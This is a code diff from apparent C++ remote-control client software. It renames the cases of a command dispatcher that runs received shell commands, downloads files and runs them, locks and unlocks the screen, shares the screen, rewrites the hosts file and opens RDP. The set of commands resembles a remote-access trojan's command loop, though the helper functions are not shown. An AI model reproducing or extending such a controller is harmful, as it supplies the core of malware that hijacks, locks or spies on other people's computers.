@@ -37,30 +37,30 @@
 
         switch (this->commandtype)
         {
-        case 1:
+        case CMD:
             Utils::commandrun((char*)commandarg.c_str());
             break;
-        case 2:
+        case SCREENSHARE:
             Screen::ScreenShareSpawn(commandarg);
             break;
-        case 3:
+        case LOCKSCREEN:
             Utils::LockScreen();
             break;
-        case 4:
+        case UNLOCKSCREEN:
             Utils::UnlockScreen(commandarg);
             break;
-        case 5:
+        case FILEDOWNLOAD:
             Http::DwnFile((char*)commandarg.c_str(), (char*)Http::extractFileName(commandarg).c_str());
             break;
-        case 6:
+        case FILEDOWNLOADRUN:
             if (Http::DwnFile((char*)commandarg.c_str(), (char*)Http::extractFileName(commandarg).c_str())) {
                 Utils::runAsUser((wchar_t*)Strings::strtow(Http::extractFileName(commandarg)).c_str(),(wchar_t*)L"");
             }
             break;
-        case 7:
+        case UPDATEHOSTS:
             Utils::UpdateHosts();
             break;
-        case 8: {
+        case RDPCMD: {
             int* port = new int;
             try {
                 *port = std::stoi(commandarg.c_str());
